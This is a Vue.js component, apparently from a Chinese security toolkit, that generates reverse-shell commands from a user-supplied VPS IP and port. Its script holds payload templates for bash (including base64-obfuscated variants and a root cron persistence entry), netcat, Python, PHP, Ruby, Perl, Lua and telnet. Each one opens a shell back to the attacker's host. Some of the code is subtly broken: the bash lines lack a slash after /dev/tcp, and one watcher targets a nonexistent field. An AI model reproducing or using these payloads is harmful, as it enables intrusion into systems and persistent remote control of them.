<template>
    <div>
        <v-container>
            <v-row>
                <v-col :cols="12">
                    <v-alert
                        outlined
                        type="success"
                        text
                    >
                        反弹 Shell
                    </v-alert>
                    <v-divider></v-divider>
                    <v-card-text>
                        <v-icon color="green">
                            mdi-information
                        </v-icon>
                        一些须知：
                        <ul>
                            <li>纯前端实现，随便造</li>
                            <li>支持最常见的几类反弹Shell命令</li>
                            <li>请输入您的VPS IP与端口</li>
                        </ul>
                    </v-card-text>
                    <v-divider></v-divider>
                </v-col>
                <v-col :cols="12">
                    <v-card-text>
                        <v-row>
                            <v-col :cols="6">
                                <v-text-field
                                    v-model="ip"
                                    label="IP"
                                    outlined
                                ></v-text-field>
                            </v-col>
                            <v-col :cols="6">
                                <v-text-field
                                    v-model.number="port"
                                    label="端口"
                                    outlined
                                ></v-text-field>
                            </v-col>
                        </v-row>
                    </v-card-text>
                    <v-divider></v-divider>
                </v-col>
                <v-col :cols="12">
                    <div class="rot-item" v-for="(i, k) in result" :key="k">
                        <v-textarea
                            v-model="i.shell"
                            :label="`${i.type} 反弹 Shell`"
                            rows="1"
                        ></v-textarea>
                    </div>
                </v-col>
            </v-row>
        </v-container>
    </div>
</template>

<script>

export default {
    data : () => ({
        ip : '',
        port : 0,
        result : [],
    }),
    methods: {
        update() {
            const re1 = `bash -i >& /dev/tcp${this.ip}/${this.port} 0>&1`
            const re11 = `echo ${btoa(`bash -i >& /dev/tcp${this.ip}/${this.port} 0>&1`)} | base64 -d | bash`
            const re12 = `echo%20${btoa(`bash -i >& /dev/tcp${this.ip}/${this.port} 0>&1`)}|base64%20-d|bash`
            const re13 = `echo "* * * * * bash -i >& /dev/tcp${this.ip}/${this.port} 0>&1" >> /var/spool/cron/root`
            const re2 = `nc -e /bin/sh ${this.ip} ${this.port}`
            const re3 = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${this.ip}",${this.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
            const re4 = `php -r '$sock=fsockopen("${this.ip}",${this.port});exec("/bin/sh -i <&3 >&3 2>&3");'`
            const re5 = `ruby -rsocket -e'f=TCPSocket.open("${this.ip}",${this.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
            const re6 = `perl -e 'use Socket;$i="${this.ip}";$p=${this.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
            const re7 = `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${this.ip}','${this.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`
            const re8 = `telnet ${this.ip} ${this.port} | /bin/sh | telnet ${this.ip} ${this.port}`

            this.result = [
                {type : 'bash', shell: re1},
                {type : 'bash', shell: re11},
                {type : 'bash', shell: re12},
                {type : 'bash', shell: re13},
                {type : 'nc', shell: re2},
                {type : 'python', shell: re3},
                {type : 'php', shell: re4},
                {type : 'ruby', shell: re5},
                {type : 'perl', shell: re6},
                {type : 'lua', shell: re7},
                {type : 'telnet', shell: re8},
            ]
        }
    },
    watch : {
        src() {
            this.update()
        },
        port() {
            this.update()
        }
    },
}
</script>

<style>
.rot-item {
    padding: 3px;
}
</style>